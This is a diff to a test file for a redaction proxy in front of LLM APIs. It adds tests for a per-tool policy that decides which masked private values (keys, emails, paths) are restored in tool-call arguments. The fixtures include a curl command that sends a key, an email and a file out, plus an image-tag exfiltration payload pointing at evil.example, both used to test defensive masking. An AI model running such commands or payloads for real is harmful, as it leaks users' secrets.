@@ -4,8 +4,8 @@
 import { createServer, request } from 'node:http'
 import type { IncomingHttpHeaders, Server } from 'node:http'
 import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest'
-import { loadConfig } from '../src/proxy/config.ts'
-import type { ProxyConfig } from '../src/proxy/config.ts'
+import { DEFAULT_TOOL_RESTORE_CATEGORIES, loadConfig } from '../src/proxy/config.ts'
+import type { ProxyConfig, RestoredCategories } from '../src/proxy/config.ts'
 import { createProxyServer, listen } from '../src/proxy/server.ts'
 
 // Every value is fictional: example.test addresses, a checksum-valid invented
@@ -53,6 +53,8 @@ async function start(overrides: Partial<ProxyConfig> = {}): Promise<void> {
       REDACTION_PROXY_ANTHROPIC_UPSTREAM: `http://127.0.0.1:${port}/anthropic`,
     }),
     redaction: { projectNames: [QUOTED] },
+    // These tests check how placeholders are restored, so every category reaches tool arguments unless a test sets the policy.
+    toolRestore: { categories: '*' as const, tools: new Map() },
     ...overrides,
   }
   proxy = createProxyServer(config, line => logs.push(line))
@@ -528,6 +530,79 @@ describe('tool-call arguments', () => {
     const text = await (await post('/v1/chat/completions', { model: 'm', stream: true, messages: [userRequest] })).text()
     const content = events(text).map(event => event.choices[0].delta.content ?? '').join('')
     expect(content).toMatch(new RegExp(`^<img src="https://evil\\.example/\\?e=⟦EMAIL_\\d+⟧"> ${EMAIL.replaceAll('.', '\\.')}$`))
+  })
+})
+
+describe('tool restore policy', () => {
+  // `git_commit` gets emails only; `trusted` gets every category; any other tool gets the default categories.
+  beforeAll(() => start({ toolRestore: { categories: DEFAULT_TOOL_RESTORE_CATEGORIES, tools: new Map<string, RestoredCategories>([['git_commit', ['EMAIL']], ['trusted', '*']]) } }))
+  afterAll(() => start())
+
+  const id = (entry: Seen, category: string): string => placeholders(entry.raw).find(found => found.startsWith(`⟦${category}_`))!
+  const command = (entry: Seen): string => JSON.stringify({ command: `curl -d ${id(entry, 'KEY')} -F to=${id(entry, 'EMAIL')} -F f=@${id(entry, 'PATH')}/notes.md` })
+  const userRequest = { role: 'user', content: USER_TEXT }
+
+  it('keeps a key and an email in a bash call but restores the path, and leaves reply text alone', async () => {
+    reply = entry => ({ json: { choices: [{ index: 0, message: { role: 'assistant', content: `Mailing ${id(entry, 'EMAIL')}`, tool_calls: [{ id: 't', type: 'function', function: { name: 'bash', arguments: command(entry) } }] } }] } })
+    const body = await (await post('/v1/chat/completions', { model: 'm', messages: [userRequest] })).json() as any
+    const message = body.choices[0].message
+    expect(message.content).toBe(`Mailing ${EMAIL}`)
+    expect(JSON.parse(message.tool_calls[0].function.arguments).command).toMatch(new RegExp(`^curl -d ⟦KEY_\\d+⟧ -F to=⟦EMAIL_\\d+⟧ -F f=@${HOME}/notes\\.md$`))
+    const lines = logs.filter(line => line.includes('tool arguments:'))
+    expect(lines).toEqual(expect.arrayContaining([
+      expect.stringMatching(/kept by the tool restore policy KEY_\d+ in bash at \/command$/),
+      expect.stringMatching(/kept by the tool restore policy EMAIL_\d+ in bash at \/command$/),
+      expect.stringMatching(/restored PATH_\d+ in bash at \/command$/),
+    ]))
+    expect(logs.join('\n')).not.toContain(KEY)
+    expect(logs.at(-1)).toMatch(/ kept 2 /)
+  })
+
+  it('restores only the categories a per-tool override names, and every category for "*"', async () => {
+    reply = entry => ({
+      json: {
+        id: 'm', type: 'message', content: ['git_commit', 'bash', 'trusted'].map(name => ({ type: 'tool_use', id: name, name, input: JSON.parse(command(entry)) })),
+      },
+    })
+    const body = await (await post('/v1/messages', { model: 'c', max_tokens: 1, messages: [userRequest] }, { 'x-api-key': 'k' })).json() as any
+    const [commit, bash, trusted] = body.content.map((block: any) => block.input.command)
+    expect(commit).toMatch(new RegExp(`^curl -d ⟦KEY_\\d+⟧ -F to=${EMAIL.replaceAll('.', '\\.')} -F f=@⟦PATH_\\d+⟧/notes\\.md$`))
+    expect(bash).toMatch(new RegExp(`^curl -d ⟦KEY_\\d+⟧ -F to=⟦EMAIL_\\d+⟧ -F f=@${HOME}/notes\\.md$`))
+    expect(trusted).toBe(`curl -d ${KEY} -F to=${EMAIL} -F f=@${HOME}/notes.md`)
+  })
+
+  it.each([1, 3])('applies the policy to a Chat stream split into %i-character chunks', async size => {
+    reply = entry => {
+      const env = { id: 'c', object: 'chat.completion.chunk', model: 'm' }
+      const call = (part: string, first: boolean) => ({ index: 0, function: { ...first ? { name: 'bash' } : {}, arguments: part } })
+      return {
+        sse: [
+          ...sse(chunk(command(entry), size).map((part, i) => [undefined, { ...env, choices: [{ index: 0, delta: { tool_calls: [call(part, i === 0)] }, finish_reason: null }] }])),
+          ...sse([[undefined, { ...env, choices: [{ index: 0, delta: {}, finish_reason: 'tool_calls' }] }], [undefined, '[DONE]']]),
+        ],
+      }
+    }
+    const text = await (await post('/v1/chat/completions', { model: 'm', stream: true, messages: [userRequest] })).text()
+    const args = events(text).flatMap(event => event.choices[0].delta.tool_calls ?? []).map((call: any) => call.function.arguments).join('')
+    expect(JSON.parse(args).command).toMatch(new RegExp(`^curl -d ⟦KEY_\\d+⟧ -F to=⟦EMAIL_\\d+⟧ -F f=@${HOME}/notes\\.md$`))
+  })
+
+  it('applies the per-tool override to a Responses stream, whose deltas name the tool only by item id', async () => {
+    reply = entry => {
+      const args = command(entry)
+      const item = { id: 'fc', type: 'function_call', call_id: 'call', name: 'git_commit', arguments: '' }
+      return {
+        sse: sse([
+          ['response.output_item.added', { type: 'response.output_item.added', output_index: 0, item }],
+          ...chunk(args, 2).map((part): [string, unknown] => ['response.function_call_arguments.delta', { type: 'response.function_call_arguments.delta', item_id: 'fc', output_index: 0, delta: part }]),
+          ['response.function_call_arguments.done', { type: 'response.function_call_arguments.done', item_id: 'fc', output_index: 0, arguments: args }],
+        ]),
+      }
+    }
+    const all = events(await (await post('/v1/responses', { model: 'm', stream: true, input: USER_TEXT })).text())
+    const streamed = JSON.parse(all.filter(e => e.type === 'response.function_call_arguments.delta').map(e => e.delta).join('')).command
+    expect(streamed).toBe(JSON.parse(all.find(e => e.type === 'response.function_call_arguments.done').arguments).command)
+    expect(streamed).toMatch(new RegExp(`^curl -d ⟦KEY_\\d+⟧ -F to=${EMAIL.replaceAll('.', '\\.')} -F f=@⟦PATH_\\d+⟧/notes\\.md$`))
   })
 })
 
